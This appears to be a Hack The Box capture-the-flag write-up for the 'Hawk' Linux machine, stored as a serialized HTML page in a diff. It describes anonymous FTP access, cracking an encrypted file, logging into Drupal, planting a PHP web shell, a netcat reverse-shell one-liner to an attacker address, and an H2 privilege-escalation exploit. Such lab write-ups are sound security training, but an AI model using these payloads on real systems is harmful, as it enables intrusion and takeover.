@@ -1,0 +1,236 @@
+I"�"<h1 id="introductionhawk">Introduction@Hawk:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Hawk</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.102</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>30</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/2570">mrh4sh</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>14th July 2018</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Decrypting a file found by logging into <code class="language-plaintext highlighter-rouge">ftp</code> using <em>anonymous</em>:<em>anonymous</em>.</li>
+  <li>Logging into the <code class="language-plaintext highlighter-rouge">drupal</code> cms.</li>
+  <li>Getting reverse shell using the <code class="language-plaintext highlighter-rouge">php filter</code> module.</li>
+  <li>Escalating privileges using <code class="language-plaintext highlighter-rouge">H2</code> exploit.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Download link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/nmap-automator-1.png" alt="" /></p>
+
+<p>Full port scan using <code class="language-plaintext highlighter-rouge">nmap</code>: <em>nmap -p- -T4 -Pn -sV 10.10.10.102</em></p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/nmap-scan-1.png" alt="" /></p>
+
+<p>Let’s check <code class="language-plaintext highlighter-rouge">Port 80</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/port-80-2.png" alt="" /></p>
+
+<p>It’s a <code class="language-plaintext highlighter-rouge">drupal</code> webiste, let’s check <strong>/robots.txt</strong>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/robots-txt-3.png" alt="" /></p>
+
+<p>I further accessed <code class="language-plaintext highlighter-rouge">http://10.10.10.102/CHANGELOG.txt</code> and found <em>drupal version</em> i.e. <code class="language-plaintext highlighter-rouge">Drupal 7.58</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/version-exposed-drupal-4.png" alt="" /></p>
+
+<p>I found an <a href="https://www.exploit-db.com/exploits/44542">exploit</a> when googled the version vulnerabilities.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/drupalexploitdb-5.png" alt="" /></p>
+
+<p>But it requires authentication of the user for that, let’s check default credentials first on the login page. It didn’t work.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Port 21</code> is also open, let’s try to login anonymously i.e. <code class="language-plaintext highlighter-rouge">anonymous</code>:<code class="language-plaintext highlighter-rouge">anonymous</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/ftp-anonymous-login-6.png" alt="" /></p>
+
+<p>We found a file in the directory, let’s downloading it using the <code class="language-plaintext highlighter-rouge">get</code> command.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/got-afile-7.png" alt="" /></p>
+
+<p>I opened the file and it looked like this:</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/opening-the-file-8.png" alt="" /></p>
+
+<p>As we know it’s encrypted I ran <code class="language-plaintext highlighter-rouge">file</code> command on it to check for more details.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/file-category-8.png" alt="" /></p>
+
+<p>It’s <code class="language-plaintext highlighter-rouge">openssl</code> and <code class="language-plaintext highlighter-rouge">base64</code> encrypted.</p>
+
+<p>Let’s decode it with base64 first.</p>
+
+<p><strong>Command</strong>: <code class="language-plaintext highlighter-rouge">cat .drupal.txt.enc | base64 --decode &gt; drupal.txt.enc.decoded</code></p>
+
+<p>Now let’s bruteforce the openssl file.</p>
+
+<p><strong>Command</strong>: <em>sudo apt-get install bruteforce-salted-openssl</em></p>
+
+<p><strong>Command</strong>: <em>bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded</em></p>
+
+<p>We were unable to find the password but it showed that <code class="language-plaintext highlighter-rouge">sha</code> is <code class="language-plaintext highlighter-rouge">256</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/ssl-brute-force-error-9.png" alt="" /></p>
+
+<p>Improvising the <strong>command</strong>: <em>bruteforce-salted-openssl -d sha256 -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded</em></p>
+
+<p>We found the password as <code class="language-plaintext highlighter-rouge">friends</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/got-password-10.png" alt="" /></p>
+
+<p>Decoding the file</p>
+
+<p><strong>Command</strong>: <em>openssl aes-256-cbc -d -in drupal.txt.enc.decoded -out drupal.txt</em></p>
+
+<p>The digest is <code class="language-plaintext highlighter-rouge">SHA256</code> and cipher used is <code class="language-plaintext highlighter-rouge">AES-256-CBC</code> because that’s the default cipher that the program uses if it’s not specified</p>
+
+<p><img src="/assets/img/hawk-hackthebox/decoding-file-11.png" alt="" /></p>
+
+<p>We got a username and password as <code class="language-plaintext highlighter-rouge">Daniel</code>:<code class="language-plaintext highlighter-rouge">PencilKeyboardScanner123</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/got-new-username-password-12.png" alt="" /></p>
+
+<p>Let’s try to login on the website using the above found credentials.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/error-screenshot-13.png" alt="" /></p>
+
+<p>It threw me an error saying <code class="language-plaintext highlighter-rouge">invalid</code> credentials.</p>
+
+<p>Let’s try <code class="language-plaintext highlighter-rouge">admin</code>:<code class="language-plaintext highlighter-rouge">PencilKeyboardScanner123</code>. Successfully logged in.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/loggedin-14.png" alt="" /></p>
+
+<p>Now in the <code class="language-plaintext highlighter-rouge">module</code> section turn on the <code class="language-plaintext highlighter-rouge">PHP filter</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/turn-on-php-filter-15.png" alt="" /></p>
+
+<p>Add a new content and add the following in the body –&gt; <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET['cmd']); ?&gt;</code>. Make sure to save the file with php.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/add-php-content-16.png" alt="" /></p>
+
+<p>Accessing <em>http://10.10.10.102/node/1?cmd=whoami</em>, we got <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/command-execution-17.png" alt="" /></p>
+
+<p>Now let’s go for the reverse shell, I used BurpSuite for it.</p>
+
+<p>Check this for the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat">payload</a></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Payload Used</strong>: *rm /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
+      <td>/bin/sh -i 2&gt;&amp;1</td>
+      <td>nc 10.10.X.X 4242 &gt;/tmp/f*</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/got-shell-18.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">User</code> Flag.</p>
+
+<p>Let’s send <code class="language-plaintext highlighter-rouge">LinEnum.sh</code> for escalating privileges.</p>
+
+<p><strong>Hosting Command</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p><strong>wget command</strong>: <em>wget http://10.10.X.X:8081/LinEnum.sh</em></p>
+
+<p>Ran LinEnum.sh after giving executing permissions using <em>chmod +x LinEnum.sh</em> and found this</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/linenum-result-19.png" alt="" /></p>
+
+<p>As we know <code class="language-plaintext highlighter-rouge">Port 8082</code> is running <strong>H2 Database</strong>, and it only allows connections locally.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/port-8082-20.png" alt="" /></p>
+
+<p>I search for some exploits and found <a href="https://www.exploit-db.com/exploits/45506">this</a></p>
+
+<p>Downloading the exploit to our victim machine using wget, and executing it we got <code class="language-plaintext highlighter-rouge">Root</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/hawk-hackthebox/got-root-21.png" alt="" /></p>
+
+:ET
